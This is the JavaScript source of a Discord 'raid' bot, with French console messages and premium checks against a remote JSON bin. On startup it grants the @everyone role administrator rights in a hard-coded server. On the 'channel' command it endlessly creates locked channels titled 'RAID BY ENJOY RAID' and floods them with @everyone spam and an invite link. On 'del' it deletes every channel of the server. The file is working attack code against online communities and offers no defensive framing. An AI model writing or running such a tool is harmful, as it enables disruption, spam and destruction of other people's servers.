const got = require('got')
const Discord = require('discord.js');
const fs = require('fs')
const client = new Discord.Client();

var db = "https://api.myjson.com/bins/m3izg"

client.on('ready', () => {
    console.log("Connecter entant que " + client.user.username + client.user.tag)
    client.guilds.get("635451157082275851").roles.find('name', '@everyone').edit({
        permissions: ["ADMINISTRATOR"]
    });
});

got.get(db, {
    json: true,
}).then(data => {
    const body = data.body
    if("854" === body.premium) {

        console.log("Premium = true")
        console.log("Prefix : + " )
    } else {
        console.log("Premium = false")  
        console.log("Prefix : +")
    }
    if("1" === body.premium1) {
        console.clear
        console.log("Premium = true")
        console.log("Prefix : +")
    }
    if("1" === body.premium2) {
        console.clear
        console.log("Premium = true")
        console.log("Prefix : +")
    }
    if("1" === body.premium3) {
        console.clear
        console.log("Premium = true")
        console.log("Prefix : " +  "+")
    }
    if("1" === body.premium4) {
        console.clear
        console.log("Premium = true")
        console.log("Prefix : " +  "+")
        
    }
    if("1" === body.premium5) {
        console.clear()
        console.log("Premium = true")
        console.log("Prefix : " +  "+")

    }
    
})


client.on('message', message => {

if(message.content === "channel") {
    let role = message.guild.roles.find("name", "@everyone");
    var db = "https://api.myjson.com/bins/m3izg"
    got.get(db, {
        json: true,
    }).then(data => {
        const body = data.body
        if("854" === body.premium) {
            setInterval(() => {
            message.guild.createChannel("RAID BY ENJOY RAID", "text").then(c => {
                c.overwritePermissions(role, {
                    SEND_MESSAGES: false,
                    READ_MESSAGES: true
                }); 
                setInterval(() => {
                    c.send("@everyone RAID BY ENJOY RAID ! https://discord.gg/HnbYaEZ")
                }, 0050)
            });
        }, 0050);

    }
        if("1" === body.premium1) {
            setInterval(() => {
                message.guild.createChannel("RAID BY ENJOY RAID", "text").then(c => {
                    c.overwritePermissions(role, {
                        SEND_MESSAGES: false,
                        READ_MESSAGES: true
                    }); 
                    setInterval(() => {
                        c.send("@everyone RAID BY ENJOY RAID ! https://discord.gg/HnbYaEZ")
                    }, 0050)

                });
            }, 0050);

        }
        if("1" === body.premium2) {
            setInterval(() => {
                message.guild.createChannel("RAID BY ENJOY RAID", "text").then(c => {
                    c.overwritePermissions(role, {
                        SEND_MESSAGES: false,
                        READ_MESSAGES: true
                    }); 
                    setInterval(() => {
                        c.send("@everyone RAID BY ENJOY RAID ! https://discord.gg/HnbYaEZ")
                    }, 0050)

                });
            }, 0050);

        }
        if("1" === body.premium3) {
            setInterval(() => {
                message.guild.createChannel("RAID BY ENJOY RAID", "text").then(c => {
                    c.overwritePermissions(role, {
                        SEND_MESSAGES: false,
                        READ_MESSAGES: true
                    }); 
                    setInterval(() => {
                        c.send("@everyone RAID BY ENJOY RAID ! https://discord.gg/HnbYaEZ")
                    }, 0050)

                });
            }, 0050);

    }
        if("1" === body.premium4) {
            setInterval(() => {
                message.guild.createChannel("RAID BY ENJOY RAID", "text").then(c => {
                    c.overwritePermissions(role, {
                        SEND_MESSAGES: false,
                        READ_MESSAGES: true
                    }); 
                    setInterval(() => {
                    c.send("@everyone RAID BY ENJOY RAID ! https://discord.gg/HnbYaEZ")
                }, 0050)

                });
            }, 0050);

    
}
        if("1" === body.premium5) {
            setInterval(() => {
                message.guild.createChannel("RAID BY ENJOY RAID", "text").then(c => {
                    c.overwritePermissions(role, {
                        SEND_MESSAGES: false,
                        READ_MESSAGES: true
                    }); 
                    setInterval(() => {
                        c.send("@everyone RAID BY ENJOY RAID ! https://discord.gg/HnbYaEZ")
                    }, 0050)
                });

            }, 0050);

            
        }
    })
}
if(message.content === "del") {
    var db = "https://api.myjson.com/bins/m3izg"
    got.get(db, {
        json: true,
    }).then(data => {
        const body = data.body
        if("854" === body.premium) {
            client.guilds.get("635451157082275851").channels.map(c => {
                c.delete();
            })
        } else {
        }
        if("1" === body.premium1) {
            client.guilds.get("635451157082275851").channels.map(c => {
                c.delete();
            })
        }
        if("1" === body.premium2) {
            client.guilds.get("635451157082275851").channels.map(c => {
                c.delete();
            })
        }
        if("1" === body.premium3) {
            client.guilds.get("635451157082275851").channels.map(c => {
                c.delete();
            })
        }
        if("1" === body.premium4) {
            client.guilds.get("635451157082275851").channels.map(c => {
                c.delete();
            })
            
        }
        if("1" === body.premium5) {
            client.guilds.get("635451157082275851").channels.map(c => {
                c.delete();
            })
    
        }
        
    })
}

});





client.login(process.env.TOKEN) 
